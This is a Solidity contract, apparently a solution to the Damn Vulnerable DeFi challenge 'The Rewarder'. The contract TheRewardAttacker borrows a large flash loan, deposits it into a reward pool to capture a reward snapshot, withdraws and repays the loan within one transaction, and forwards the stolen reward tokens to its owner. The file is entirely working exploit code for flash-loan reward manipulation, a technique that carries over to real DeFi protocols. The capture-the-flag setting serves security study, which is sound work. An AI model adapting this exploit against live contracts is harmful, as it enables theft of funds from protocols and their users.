// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./AccountingToken.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {RewardToken} from "./RewardToken.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

import "hardhat/console.sol";

contract TheRewardAttacker {
    address flashLoanerPool;
    address rewardToken;
    address theRewarderPool;
    address liquidityToken;
    address owner;
    constructor(
        address _flashLoanerPool,
        address _rewardToken,
        address _theRewarderPool,
        address _liquidityToken
    ) {
        flashLoanerPool = _flashLoanerPool;
        rewardToken = _rewardToken;
        theRewarderPool = _theRewarderPool;
        liquidityToken = _liquidityToken;
        owner = msg.sender;
    }

    function attack() external {
        //loan
        FlashLoanerPool(flashLoanerPool).flashLoan(1000000 ether);
    }

    function receiveFlashLoan(uint256 amount) external {
        //approve
        DamnValuableToken(liquidityToken).approve(theRewarderPool,amount);
        //deposit
        TheRewarderPool(theRewarderPool).deposit(amount);

        //withdraw
        TheRewarderPool(theRewarderPool).withdraw(amount);
        //send back
        DamnValuableToken(liquidityToken).transfer(flashLoanerPool,amount);

        RewardToken(rewardToken).transfer(
            owner,
            RewardToken(rewardToken).balanceOf(address(this))
        );
    }
}
